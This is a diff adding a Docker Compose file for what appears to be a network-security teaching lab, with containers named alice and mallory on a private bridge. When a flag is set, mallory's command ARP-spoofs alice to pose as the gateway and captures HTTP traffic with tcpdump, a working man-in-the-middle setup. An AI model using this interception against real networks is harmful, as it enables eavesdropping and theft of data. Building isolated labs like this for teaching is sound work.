@@ -1,0 +1,26 @@
+services:
+  alice:
+    container_name: alice
+    build: .
+    tty: true
+    stdin_open: true
+    networks:
+      wonderland:
+        ipv4_address: 10.0.1.2
+  mallory:
+    container_name: mallory
+    build: .
+    tty: true
+    stdin_open: true
+    networks:
+      wonderland:
+        ipv4_address: 10.0.1.3
+    environment: 
+      - RUN_ARPSPOOF=${RUN_ARPSPOOF}
+    command: bash -c "if [ $RUN_ARPSPOOF -eq 1 ]; then (arpspoof -i eth0 -t 10.0.1.2 10.0.1.1 &> /dev/null &) && tcpdump -v 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'; fi"
+networks:
+  wonderland:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 10.0.1.0/24
